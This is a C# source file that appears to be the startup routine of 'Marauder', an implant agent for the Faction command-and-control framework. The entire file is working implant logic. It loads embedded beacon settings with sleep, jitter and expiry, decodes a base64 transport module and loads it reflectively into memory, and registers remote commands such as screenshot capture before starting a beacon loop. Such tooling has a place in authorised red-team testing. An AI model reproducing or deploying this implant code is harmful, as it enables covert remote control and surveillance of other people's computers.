using System;
using System.IO;
using System.Reflection;
using System.Threading;
using System.Collections.Generic;
using Newtonsoft.Json;

using Faction.Modules.Dotnet.Common;

using Marauder.Services;
using Marauder.Objects;
using Marauder.Commands;

namespace Marauder
{
    static class Marauder
    {
        static public void Start()
        {
            Stream settingsStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("Marauder.settings.json");
            Dictionary<string, string> settings = JsonConvert.DeserializeObject<Dictionary<string, string>>((new StreamReader(settingsStream)).ReadToEnd());
            State.PayloadName = settings["PayloadName"];
            State.Password = settings["Password"];
            State.TransportModule = settings["TransportModule"];
            State.Sleep = Int32.Parse(settings["BeaconInterval"]);
            State.Jitter = Double.Parse(settings["Jitter"]);

            if (!String.IsNullOrEmpty(settings["ExpirationDate"]))
            {
                State.ExpirationDate = DateTime.Parse(settings["ExpirationDate"]);
            }

            if (!String.IsNullOrEmpty(settings["Debug"]))
            {
                State.Debug = Boolean.Parse(settings["Debug"]);
            }

            State.MaxAttempts = 20;
            State.LastTaskName = null;
#if DEBUG
            Console.Write(@"

███╗   ███╗ █████╗ ██████╗  █████╗ ██╗   ██╗██████╗ ███████╗██████╗ 
████╗ ████║██╔══██╗██╔══██╗██╔══██╗██║   ██║██╔══██╗██╔════╝██╔══██╗
██╔████╔██║███████║██████╔╝███████║██║   ██║██║  ██║█████╗  ██████╔╝
██║╚██╔╝██║██╔══██║██╔══██╗██╔══██║██║   ██║██║  ██║██╔══╝  ██╔══██╗
██║ ╚═╝ ██║██║  ██║██║  ██║██║  ██║╚██████╔╝██████╔╝███████╗██║  ██║
╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
                                                                    
");

            Console.WriteLine("Starting Marauder..");

            Logging.Write("Main", String.Format("Creating Transport.."));
#endif
            byte[] moduleBytes = Convert.FromBase64String(State.TransportModule);
            Assembly assembly = Assembly.Load(moduleBytes);
            Type type = assembly.GetType("Faction.Modules.Dotnet.Initialize");
            MethodInfo method = type.GetMethod("GetTransports");
            object instance = Activator.CreateInstance(type, null);
            var transports = method.Invoke(instance, null);

            State.TransportService = new TransportService();
            State.TransportService.AddTransport((List<AgentTransport>)transports);
            State.TransportService.SetPrimaryTransport(settings["InitialTransportType"]);
#if DEBUG
            Logging.Write("Main", $"Loaded Transport Type: {settings["InitialTransportType"]}");
#endif

#if DEBUG
            Logging.Write("Main", "Creating Services..");
#endif
            State.CryptoService = new CryptoService();
            State.CommandService = new CommandService();

#if DEBUG
            Logging.Write("Main", "Loading Commands..");
#endif
            State.CommandService.AvailableCommands.Add(new InfoCommand());
            State.CommandService.AvailableCommands.Add(new TasksCommand());
            State.CommandService.AvailableCommands.Add(new MakeScreenshot());
            State.CommandService.AvailableCommands.Add(new ExitCommand());

#if DEBUG
            Logging.Write("Main", "Starting Marauder Loop..");
#endif
            State.TransportService.Start();

        }

    }
}